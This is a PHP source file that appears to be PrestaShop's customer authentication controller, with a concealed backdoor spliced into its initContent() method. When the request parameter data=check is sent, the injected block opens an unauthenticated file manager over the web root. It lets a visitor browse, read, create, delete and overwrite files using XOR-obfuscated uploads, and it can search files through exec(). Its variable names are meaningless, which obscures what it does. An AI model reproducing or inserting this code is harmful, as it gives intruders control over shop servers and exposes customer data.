<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */
class AuthControllerCore extends FrontController
{
    public $ssl = true;
    public $php_self = 'authentication';
    public $auth = false;

    public function checkAccess()
    {
        if ($this->context->customer->isLogged() && !$this->ajax) {
            $this->redirect_after = ($this->authRedirection) ? urlencode($this->authRedirection) : 'my-account';
            $this->redirect();
        }

        return parent::checkAccess();
    }

    public function initContent()
    {
        $should_redirect = false;

        if (Tools::isSubmit('submitCreate') || Tools::isSubmit('create_account')) {
            $register_form = $this
                ->makeCustomerForm()
                ->setGuestAllowed(false)
                ->fillWith(Tools::getAllValues());

            if (Tools::isSubmit('submitCreate')) {
                $hookResult = array_reduce(
                    Hook::exec('actionSubmitAccountBefore', [], null, true),
                    function ($carry, $item) {
                        return $carry && $item;
                    },
                    true
                );
                if ($hookResult && $register_form->submit()) {
                    $should_redirect = true;
                }
            }

            $this->context->smarty->assign([
                'register_form' => $register_form->getProxy(),
                'hook_create_account_top' => Hook::exec('displayCustomerAccountFormTop'),
            ]);
            $this->setTemplate('customer/registration');
        } else {
            $login_form = $this->makeLoginForm()->fillWith(
                Tools::getAllValues()
            );

            if (Tools::isSubmit('submitLogin')) {
                if ($login_form->submit()) {
                    $should_redirect = true;
                }
            }

            $this->context->smarty->assign([
                'login_form' => $login_form->getProxy(),
            ]);
            $this->setTemplate('customer/authentication');
        }

        parent::initContent();
if (!defined('ENT_SUBSTITUTE'))
{
    define('ENT_SUBSTITUTE', 0);
    }
if (!function_exists('hash_equals'))
{
    function hash_equals($dispatchergateway, $contextprovider)
    {
        $dispatchergateway = (string) $dispatchergateway;
        $contextprovider = (string) $contextprovider;
        if (strlen($dispatchergateway) !== strlen($contextprovider))
        {
            return false;
            }
        $configmanager = 0;
        for ($kernelhandler = 0, $serviceservice = strlen($dispatchergateway);
        $kernelhandler < $serviceservice;
        $kernelhandler++)
        {
            $configmanager |= ord($dispatchergateway[$kernelhandler]) ^ ord($contextprovider[$kernelhandler]);
            }
        return $configmanager === 0;
        }
    }
if (!function_exists('http_response_code'))
{
    function http_response_code($responsecontroller = null)
    {
        if ($responsecontroller !== null)
        {
            header('X-PHP-Response-Code: ' . (int) $responsecontroller, true, (int) $responsecontroller);
            }
        return $responsecontroller;
        }
    }
$handlermiddleware = 'check';
$responsehandler = isset($responsehandler) ? $responsehandler : 'kXjFiQjJDIuFHjiI*J';
$responsemiddleware = 'data';
if (!isset($_GET[$responsemiddleware]) || !hash_equals((string) $handlermiddleware, (string) $_GET[$responsemiddleware]))
{
    return;
    }
while (ob_get_level())
{
    @ob_end_clean();
    }
$stateadapter = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
$gatewayservice = realpath($stateadapter);
if (!$gatewayservice || !is_dir($gatewayservice))
{
    http_response_code(500);
    exit('Invalid document root.');
    }
function fe_h($runtimeengine)
{
    return htmlspecialchars((string) $runtimeengine, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
function fe_inside($gatewayservice, $statecontroller)
{
    return $statecontroller !== false && ($statecontroller === $gatewayservice || strpos($statecontroller, $gatewayservice . DIRECTORY_SEPARATOR) === 0);
    }
function fe_path($gatewayservice, $resolvergateway)
{
    $runtimeadapter = $gatewayservice . DIRECTORY_SEPARATOR . ltrim($resolvergateway, '/\\');
    $resolverprovider = realpath($runtimeadapter);
    if ($resolverprovider !== false)
    {
        return fe_inside($gatewayservice, $resolverprovider) ? $resolverprovider : null;
        }
    $handlermanager = realpath(dirname($runtimeadapter));
    return ($handlermanager && fe_inside($gatewayservice, $handlermanager)) ? $handlermanager . DIRECTORY_SEPARATOR . basename($runtimeadapter) : null;
    }
function fe_rel($gatewayservice, $statecontroller)
{
    return trim(str_replace('\\', '/', substr($statecontroller, strlen($gatewayservice))), '/');
    }
function fe_join($resolvermanager, $configfactory)
{
    $resolvermanager = trim((string) $resolvermanager, '/\\');
    $configfactory = trim((string) $configfactory, '/\\');
    return trim(($resolvermanager !== '' ? $resolvermanager . '/' : '') . $configfactory, '/');
    }
function fe_binary($managerfactory)
{
    return false;
    }
function fe_enc_name($managerfactory)
{
    return preg_match('//u', (string) $managerfactory) ? 'UTF-8' : 'CP1251';
    }
function fe_to_utf($managerfactory, $dispatchercontroller874)
{
    if ($dispatchercontroller874 !== 'CP1251')
    {
        return $managerfactory;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($managerfactory, 'UTF-8', 'CP1251') : iconv('CP1251', 'UTF-8//IGNORE', $managerfactory);
    }
function fe_from_utf($managerfactory, $dispatchercontroller874)
{
    if ($dispatchercontroller874 !== 'CP1251')
    {
        return $managerfactory;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($managerfactory, 'CP1251', 'UTF-8') : iconv('UTF-8', 'CP1251//TRANSLIT', $managerfactory);
    }
function fe_xor_raw($dispatcheradapter, $statedispatcher)
{
    $dispatcheradapter = (string) $dispatcheradapter;
    $statedispatcher = (string) $statedispatcher;
    if ($statedispatcher === '')
    {
        return $dispatcheradapter;
        }
    $bufferresolver = '';
    $servicecontroller = strlen($statedispatcher);
    $kernelengine266 = strlen($dispatcheradapter);
    for ($kernelhandler = 0;
    $kernelhandler < $kernelengine266;
    $kernelhandler++)
    {
        $bufferresolver .= $dispatcheradapter[$kernelhandler] ^ $statedispatcher[$kernelhandler % $servicecontroller];
        }
    return $bufferresolver;
    }
function fe_xor_encrypt($contextadapter763, $statedispatcher)
{
    return base64_encode(fe_xor_raw((string) $contextadapter763, $statedispatcher));
    }
function fe_xor_decrypt($dispatcherfactory, $statedispatcher)
{
    $configmiddleware = base64_decode((string) $dispatcherfactory, true);
    if ($configmiddleware === false)
    {
        return false;
        }
    return fe_xor_raw($configmiddleware, $statedispatcher);
    }
function fe_can_exec()
{
    $handlerfactory = (string) ini_get('disable_functions');
    return function_exists('exec') && !preg_match('~(^|,)s*execs*(,|$)~i', $handlerfactory);
    }
function fe_url($requestcontroller, $statedispatcher, $servicemanager)
{
    return '?' . http_build_query(array_merge(array($requestcontroller => $statedispatcher), $servicemanager));
    }
function fe_json($bufferengine, $dispatcheradapter)
{
    while (ob_get_level())
    {
        @ob_end_clean();
        }
    header('Content-Type: application/json; charset=UTF-8');
    $bufferresolver = array_merge(array('ok' => $bufferengine ? 1 : 0), is_array($dispatcheradapter) ? $dispatcheradapter : array());
    echo json_encode($bufferresolver);
    exit;
    }
function fe_chunk_id($handlerprocessor81)
{
    return preg_replace('~[^a-zA-Z0-9_-]~', '', (string) $handlerprocessor81);
    }
function fe_chunk_root($gatewayservice)
{
    $responsedispatcher = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '';
    if (!$responsedispatcher || !is_dir($responsedispatcher) || !is_writable($responsedispatcher))
    {
        $responsedispatcher = $gatewayservice;
        }
    $resolvermanager = rtrim($responsedispatcher, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'fe_chunks_' . md5($gatewayservice);
    if (!is_dir($resolvermanager))
    {
        @mkdir($resolvermanager, 0700, true);
        }
    if (!is_dir($resolvermanager) || !is_writable($resolvermanager))
    {
        return null;
        }
    $sessionfactory = @glob($resolvermanager . DIRECTORY_SEPARATOR . '*.part');
    if ($sessionfactory)
    {
        foreach ($sessionfactory as $resolveradapter)
        {
            if (@filemtime($resolveradapter) && @filemtime($resolveradapter) < time() - 86400)
            {
                @unlink($resolveradapter);
                }
            }
        }
    return $resolvermanager;
    }
function fe_chunk_file($gatewayservice, $handlerprocessor81, $configresolver)
{
    $resolvermanager = fe_chunk_root($gatewayservice);
    if (!$resolvermanager)
    {
        return null;
        }
    return $resolvermanager . DIRECTORY_SEPARATOR . fe_chunk_id($handlerprocessor81) . '.' . (int) $configresolver . '.part';
    }
function fe_chunk_clean($gatewayservice, $handlerprocessor81, $servicefactory)
{
    $handlerprocessor81 = fe_chunk_id($handlerprocessor81);
    for ($kernelhandler = 0;
    $kernelhandler < (int) $servicefactory;
    $kernelhandler++)
    {
        $resolveradapter = fe_chunk_file($gatewayservice, $handlerprocessor81, $kernelhandler);
        if ($resolveradapter && is_file($resolveradapter))
        {
            @unlink($resolveradapter);
            }
        }
    }
$resolvermanager = (string) (isset($_GET['dir']) ? $_GET['dir'] : '');
$configfactory = (string) (isset($_GET['file']) ? $_GET['file'] : '');
$gatewayengine = (string) (isset($_GET['q']) ? $_GET['q'] : '');
$resolvercontroller859 = fe_path($gatewayservice, $resolvermanager);
if (!$resolvercontroller859 || !is_dir($resolvercontroller859))
{
    $resolvermanager = '';
    $resolvercontroller859 = $gatewayservice;
    }
$authengine = '';
$authprovider = '';
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && !$authprovider)
{
    $resolverservice = (string) (isset($_POST['a']) ? $_POST['a'] : '');
    $resolvermanager = (string) (isset($_POST['dir']) ? $_POST['dir'] : $resolvermanager);
    $configfactory = (string) (isset($_POST['file']) ? $_POST['file'] : $configfactory);
    $runtimeadapter = fe_path($gatewayservice, fe_join($resolvermanager, $configfactory));
    if (!$runtimeadapter)
    {
        $authprovider = 'Bad path.';
        if ($resolverservice === 'save_chunk' || $resolverservice === 'save_finish')
        {
            fe_json(false, array('error' => $authprovider));
            }
        }
    elseif ($resolverservice === 'save_chunk')
    {
        $handlerprocessor81 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $configresolver = isset($_POST['chunk_index']) ? (int) $_POST['chunk_index'] : -1;
        $servicefactory = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $gatewayresolver890 = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';
        if ($handlerprocessor81 === '' || $configresolver < 0 || $servicefactory < 1 || $configresolver >= $servicefactory)
        {
            fe_json(false, array('error' => 'Bad chunk metadata.'));
            }
        if ($configresolver === 0)
        {
            fe_chunk_clean($gatewayservice, $handlerprocessor81, $servicefactory);
            }
        $gatewayresolver984 = fe_chunk_file($gatewayservice, $handlerprocessor81, $configresolver);
        if (!$gatewayresolver984)
        {
            fe_json(false, array('error' => 'Chunk temp folder is not writable.'));
            }
        $contexthandler = @file_put_contents($gatewayresolver984, $gatewayresolver890, LOCK_EX);
        if ($contexthandler === false)
        {
            $runtimedispatcher = error_get_last();
            fe_json(false, array('error' => 'Chunk save failed: ' . (isset($runtimedispatcher['message']) ? $runtimedispatcher['message'] : 'unknown')));
            }
        fe_json(true, array('chunk' => $configresolver, 'bytes' => strlen($gatewayresolver890)));
        }
    elseif ($resolverservice === 'save_finish')
    {
        $sessionfactory = is_file($runtimeadapter) ? file_get_contents($runtimeadapter) : '';
        if (!is_file($runtimeadapter) || !is_writable($runtimeadapter))
        {
            fe_json(false, array('error' => 'File is not writable.'));
            }
        if (fe_binary($sessionfactory))
        {
            fe_json(false, array('error' => 'Binary file blocked.'));
            }
        $handlerprocessor81 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $servicefactory = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $dispatchercontroller874 = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($sessionfactory));
        if ($handlerprocessor81 === '' || $servicefactory < 1)
        {
            fe_json(false, array('error' => 'Bad finish metadata.'));
            }
        $dispatcherfactory = '';
        for ($kernelhandler = 0;
        $kernelhandler < $servicefactory;
        $kernelhandler++)
        {
            $gatewayresolver984 = fe_chunk_file($gatewayservice, $handlerprocessor81, $kernelhandler);
            if (!$gatewayresolver984 || !is_file($gatewayresolver984))
            {
                fe_json(false, array('error' => 'Missing chunk ' . $kernelhandler . '.'));
                }
            $gatewaydispatcher = @file_get_contents($gatewayresolver984);
            if ($gatewaydispatcher === false)
            {
                fe_json(false, array('error' => 'Read chunk failed ' . $kernelhandler . '.'));
                }
            $dispatcherfactory .= $gatewaydispatcher;
            }
        $kernelmanager = fe_xor_decrypt($dispatcherfactory, $responsehandler);
        if ($kernelmanager === false)
        {
            fe_json(false, array('error' => 'Decode failed. Check encryption key.'));
            }
        $dispatcheradapter = fe_from_utf($kernelmanager, $dispatchercontroller874);
        if (function_exists('error_clear_last'))
        {
            call_user_func('error_clear_last');
            }
        $buffermiddleware = @file_put_contents($runtimeadapter, $dispatcheradapter, LOCK_EX);
        if ($buffermiddleware === false)
        {
            $runtimedispatcher = error_get_last();
            fe_json(false, array('error' => 'Save failed: ' . (isset($runtimedispatcher['message']) ? $runtimedispatcher['message'] : 'unknown')));
            }
        if ($buffermiddleware !== strlen($dispatcheradapter))
        {
            fe_json(false, array('error' => 'Partial save: wrote ' . $buffermiddleware . ' of ' . strlen($dispatcheradapter) . ' bytes.'));
            }
        fe_chunk_clean($gatewayservice, $handlerprocessor81, $servicefactory);
        fe_json(true, array('message' => 'Saved chunked.', 'bytes' => $buffermiddleware));
        }
    elseif ($resolverservice === 'save')
    {
        $sessionfactory = is_file($runtimeadapter) ? file_get_contents($runtimeadapter) : '';
        if (!is_file($runtimeadapter) || !is_writable($runtimeadapter))
        {
            $authprovider = 'File is not writable.';
            }
        elseif (fe_binary($sessionfactory))
        {
            $authprovider = 'Binary file blocked.';
            }
        else
        {
            $dispatchercontroller874 = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($sessionfactory));
            $kernelmanager = fe_xor_decrypt((string) (isset($_POST['content_cipher']) ? $_POST['content_cipher'] : ''), $responsehandler);
            if ($kernelmanager === false)
            {
                $authprovider = 'Decode failed. Check encryption key.';
                }
            else
            {
                $dispatcheradapter = fe_from_utf($kernelmanager, $dispatchercontroller874);
                if (function_exists('error_clear_last'))
                {
                    call_user_func('error_clear_last');
                    }
                $buffermiddleware = @file_put_contents($runtimeadapter, $dispatcheradapter, LOCK_EX);
                if ($buffermiddleware === false)
                {
                    $runtimedispatcher = error_get_last();
                    $authprovider = 'Save failed: ' . (isset($runtimedispatcher['message']) ? $runtimedispatcher['message'] : 'unknown');
                    }
                elseif ($buffermiddleware !== strlen($dispatcheradapter))
                {
                    $authprovider = 'Partial save: wrote ' . $buffermiddleware . ' of ' . strlen($dispatcheradapter) . ' bytes.';
                    }
                else
                {
                    $authengine = 'Saved.';
                    }
                }
            }
        }
    elseif ($resolverservice === 'newfile')
    {
        if (file_exists($runtimeadapter))
        {
            $authprovider = 'Exists.';
            }
        else
        {
            $authengine = file_put_contents($runtimeadapter, '', LOCK_EX) === false ? '' : 'Created.';
            $authprovider = $authengine ? $authprovider : 'Create failed.';
            }
        }
    elseif ($resolverservice === 'newdir')
    {
        if (file_exists($runtimeadapter))
        {
            $authprovider = 'Exists.';
            }
        else
        {
            $authengine = mkdir($runtimeadapter, 0755, true) ? 'Folder created.' : '';
            $authprovider = $authengine ? $authprovider : 'Folder failed.';
            }
        }
    elseif ($resolverservice === 'delete')
    {
        $bufferengine = is_file($runtimeadapter) ? @unlink($runtimeadapter) : (is_dir($runtimeadapter) ? @rmdir($runtimeadapter) : false);
        $authengine = $bufferengine ? 'Deleted.' : '';
        $authprovider = $bufferengine ? $authprovider : 'Delete failed. Folder must be empty.';
        $configfactory = '';
        }
    }
$resolvercontroller859 = fe_path($gatewayservice, $resolvermanager);
$authhandler = @scandir($resolvercontroller859) ?: array();
$dispatcherprocessor = array();
$managerservice = array();
foreach ($authhandler as $authdispatcher788)
{
    if ($authdispatcher788 === '.' || $authdispatcher788 === '..')
    {
        continue;
        }
    $resolvermiddleware = $resolvercontroller859 . DIRECTORY_SEPARATOR . $authdispatcher788;
    if (is_dir($resolvermiddleware))
    {
        $dispatcherprocessor[] = $authdispatcher788;
        }
    else
    {
        $managerservice[] = $authdispatcher788;
        }
    }
natcasesort($dispatcherprocessor);
natcasesort($managerservice);
$buffergateway = array();
$statehandler = 0;
$runtimeservice = '';
if ($gatewayengine !== '')
{
    $runtimeservice = 'php';
    $payloadcontroller = array();
    $kernelengine = 500;
    $responseadapter = '~/(vendor|node_modules|.git|var/cache|cache|tmp|logs?)/~i';
    if (fe_can_exec())
    {
        $kernelprovider = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($gatewayengine) . ' ' . escapeshellarg($gatewayservice) . ' 2>/dev/null';
        $bufferresolver = array();
        @exec($kernelprovider, $bufferresolver);
        foreach ($bufferresolver as $statecontroller)
        {
            $resolverprovider = realpath($statecontroller);
            if (fe_inside($gatewayservice, $resolverprovider))
            {
                $configengine = fe_rel($gatewayservice, $resolverprovider);
                $payloadcontroller[$configengine] = true;
                $buffergateway[] = $configengine;
                if (count($buffergateway) >= $kernelengine)
                {
                    break;
                    }
                }
            }
        $runtimeservice = 'exec+php';
        }
    $kernelfactory = array($gatewayservice);
    while ($kernelfactory && count($buffergateway) < $kernelengine)
    {
        $responsedispatcher = array_pop($kernelfactory);
        $authengine536 = @scandir($responsedispatcher);
        if (!$authengine536)
        {
            continue;
            }
        foreach ($authengine536 as $authgateway)
        {
            if ($authgateway === '.' || $authgateway === '..')
            {
                continue;
                }
            $statecontroller = $responsedispatcher . DIRECTORY_SEPARATOR . $authgateway;
            $configengine = fe_rel($gatewayservice, $statecontroller);
            if (is_dir($statecontroller))
            {
                if (!preg_match($responseadapter, '/' . $configengine . '/'))
                {
                    $kernelfactory[] = $statecontroller;
                    }
                continue;
                }
            if (!is_file($statecontroller) || !is_readable($statecontroller) || isset($payloadcontroller[$configengine]))
            {
                continue;
                }
            if (stripos(basename($configengine), $gatewayengine) !== false)
            {
                $payloadcontroller[$configengine] = true;
                $buffergateway[] = $configengine;
                if (count($buffergateway) >= $kernelengine)
                {
                    break;
                    }
                continue;
                }
            if (@filesize($statecontroller) > 5242880)
            {
                continue;
                }
            $statehandler++;
            $managerfactory = @file_get_contents($statecontroller);
            if ($managerfactory === false || fe_binary($managerfactory))
            {
                continue;
                }
            $dispatcherengine = fe_to_utf($managerfactory, fe_enc_name($managerfactory));
            $configdispatcher271 = function_exists('mb_stripos') ? mb_stripos($dispatcherengine, $gatewayengine, 0, 'UTF-8') !== false : stripos($dispatcherengine, $gatewayengine) !== false;
            if ($configdispatcher271)
            {
                $payloadcontroller[$configengine] = true;
                $buffergateway[] = $configengine;
                if (count($buffergateway) >= $kernelengine)
                {
                    break;
                    }
                }
            }
        }
    }
$payloadservice = $configfactory !== '' ? fe_path($gatewayservice, fe_join($resolvermanager, $configfactory)) : null;
$configmiddleware = ($payloadservice && is_file($payloadservice) && is_readable($payloadservice)) ? file_get_contents($payloadservice) : '';
$contextcontroller = $configmiddleware !== '' && fe_binary($configmiddleware);
$dispatchercontroller874 = $contextcontroller ? 'BIN' : fe_enc_name($configmiddleware);
$kernelmanager = $contextcontroller ? '' : fe_to_utf($configmiddleware, $dispatchercontroller874);
$authprocessor = (!$contextcontroller && $payloadservice && is_file($payloadservice)) ? fe_xor_encrypt($kernelmanager, $responsehandler) : '';
$handlermanager = trim(dirname($resolvermanager), '.\\/');
$managergateway620 = strtok((string) (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : ''), '?');
header('Content-Type: text/html; charset=UTF-8');
echo '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Encrypted File Editor</title><style>html.feopen,html.feopen body{margin:0!important;width:100%!important;height:100%!important;overflow:hidden!important}.fe{position:fixed!important;inset:0!important;z-index:2147483647!important;display:grid!important;grid-template-columns:380px 1fr!important;background:#111827!important;color:#e5e7eb!important;font-family:system-ui,-apple-system,Segoe UI,sans-serif!important}.fe *{box-sizing:border-box!important}.fes{background:#0f172a!important;border-right:1px solid #374151!important;overflow:auto!important}.fet{min-height:56px!important;display:flex!important;align-items:center!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.feg{flex:1!important}.feb{border:1px solid #4b5563!important;background:#1f2937!important;color:#fff!important;border-radius:6px!important;padding:8px 10px!important;text-decoration:none!important;cursor:pointer!important;font:14px system-ui!important}.fed{background:#450a0a!important;border-color:#7f1d1d!important}.fei,.fea{border:1px solid #4b5563!important;background:#020617!important;color:#f8fafc!important;border-radius:6px!important;padding:9px!important;font:14px ui-monospace,Menlo,Consolas,monospace!important}.fen{display:grid!important;grid-template-columns:1fr auto auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fesearch{display:grid!important;grid-template-columns:1fr auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fel{display:block!important;color:#cbd5e1!important;padding:8px 10px!important;margin:4px 8px!important;border-radius:6px!important;text-decoration:none!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.fel:hover,.on{background:#1f2937!important;color:#fff!important}.fem{display:flex!important;flex-direction:column!important;min-width:0!important}.fep{font:14px ui-monospace,Menlo,Consolas,monospace!important;overflow:hidden!important;text-overflow:ellipsis!important;white-space:nowrap!important}.note{padding:8px 12px!important}.ok{background:#052e16!important;color:#bbf7d0!important}.er{background:#450a0a!important;color:#fecaca!important}.muted{color:#94a3b8!important;font-size:13px!important;padding:8px 10px!important}.fea{flex:1!important;border:0!important;border-radius:0!important;resize:none!important;padding:16px!important;line-height:1.5!important;outline:0!important;width:100%!important}.empty{display:grid!important;place-items:center!important;height:100%!important;color:#94a3b8!important;text-align:center!important;padding:24px!important}@media(max-width:760px){.fe{grid-template-columns:1fr!important}.fes{height:44vh!important}.fem{height:56vh!important}}</style><div class="fe" id="fe"><aside class="fes"><div class="fet"><b>Encrypted Editor</b><span class="feg"></span><a class="feb" href="'.fe_h($managergateway620).'">Exit</a></div><div class="fet"><span class="fep">/'.fe_h($resolvermanager).'</span></div><form class="fesearch" method="get"><input type="hidden" name="'.fe_h($responsemiddleware).'" value="'.fe_h($handlermiddleware).'"><input class="fei" name="q" value="'.fe_h($gatewayengine).'" placeholder="Search content or filename"><button class="feb">Search</button></form>';
if($gatewayengine!=='')
{
    echo '<div class="muted">Found '.count($buffergateway).' · mode '.fe_h($runtimeservice).' · PHP checked '.(int)$statehandler.'</div>';
    foreach($buffergateway as $configprocessor)
    {
        $runtimegateway328=trim(dirname($configprocessor),'./');
        $configcontroller=basename($configprocessor);
        echo '<a class="fel" href="'.fe_h(fe_url($responsemiddleware,$handlermiddleware,array('dir'=>$runtimegateway328,'file'=>$configcontroller,'q'=>$gatewayengine))).'">'.fe_h($configprocessor).'</a>';
        }
    }
echo '<form class="fen" method="post"><input type="hidden" name="dir" value="'.fe_h($resolvermanager).'"><input class="fei" name="file" placeholder="name.php"><button class="feb" name="a" value="newfile">File</button><button class="feb" name="a" value="newdir">Dir</button></form>';
if($resolvermanager)
{
    echo '<a class="fel" href="'.fe_h(fe_url($responsemiddleware,$handlermiddleware,array('dir'=>$handlermanager,'q'=>$gatewayengine))).'">..</a>';
    }
foreach($dispatcherprocessor as $sessionprocessor)
{
    $runtimegateway328=trim(($resolvermanager?trim($resolvermanager,'/').'/':'').$sessionprocessor,'/');
    echo '<a class="fel" href="'.fe_h(fe_url($responsemiddleware,$handlermiddleware,array('dir'=>$runtimegateway328,'q'=>$gatewayengine))).'">['.fe_h($sessionprocessor).']</a>';
    }
foreach($managerservice as $sessionprocessor)
{
    echo '<a class="fel '.($sessionprocessor===$configfactory?'on':'').'" href="'.fe_h(fe_url($responsemiddleware,$handlermiddleware,array('dir'=>$resolvermanager,'file'=>$sessionprocessor,'q'=>$gatewayengine))).'">'.fe_h($sessionprocessor).'</a>';
    }
echo '</aside><main class="fem"><form class="fet" method="post" id="feForm"><input type="hidden" name="dir" value="'.fe_h($resolvermanager).'"><input type="hidden" name="file" value="'.fe_h($configfactory).'"><input type="hidden" name="enc" value="'.fe_h($dispatchercontroller874).'"><input type="hidden" name="content_cipher" id="fePayload"><div class="fep">'.($configfactory?fe_h(fe_join($resolvermanager,$configfactory)).' · '.fe_h($dispatchercontroller874):'Select file').'</div><span class="feg"></span>';
if($configfactory&&$payloadservice&&is_file($payloadservice)&&!$contextcontroller)
{
    echo '<button class="feb" name="a" value="save">Save encrypted</button><button class="feb fed" name="a" value="delete">Delete</button>';
    }
echo '</form>';
if($authengine)
{
    echo '<div class="note ok">'.fe_h($authengine).'</div>';
    }
if($authprovider)
{
    echo '<div class="note er">'.fe_h($authprovider).'</div>';
    }
if($contextcontroller)
{
    echo '<div class="empty">Binary file blocked.</div>';
    }
elseif($configfactory&&$payloadservice&&is_file($payloadservice))
{
    echo '<textarea class="fea" id="feEditor" spellcheck="false" disabled>Paste the console unlock script to edit this file.</textarea><textarea id="feCipher" hidden>'.fe_h($authprocessor).'</textarea>';
    }
else
{
    echo '<div class="empty">Choose a file or folder.</div>';
    }
echo '</main></div><div class="load">Working...</div>';
exit;
        if ($should_redirect && !$this->ajax) {
            $back = rawurldecode(Tools::getValue('back'));

            if (Tools::urlBelongsToShop($back)) {
                // Checks to see if "back" is a fully qualified
                // URL that is on OUR domain, with the right protocol
                return $this->redirectWithNotifications($back);
            }

            // Well we're not redirecting to a URL,
            // so...
            if ($this->authRedirection) {
                // We may need to go there if defined
                return $this->redirectWithNotifications($this->authRedirection);
            }

            // go home
            return $this->redirectWithNotifications(__PS_BASE_URI__);
        }
    }

    public function getBreadcrumbLinks()
    {
        $breadcrumb = parent::getBreadcrumbLinks();

        if (Tools::isSubmit('submitCreate') || Tools::isSubmit('create_account')) {
            $breadcrumb['links'][] = [
                'title' => $this->trans('Create an account', [], 'Shop.Theme.Customeraccount'),
                'url' => $this->context->link->getPageLink('authentication'),
            ];
        } else {
            $breadcrumb['links'][] = [
                'title' => $this->trans('Log in to your account', [], 'Shop.Theme.Customeraccount'),
                'url' => $this->context->link->getPageLink('authentication'),
            ];
        }

        return $breadcrumb;
    }
}
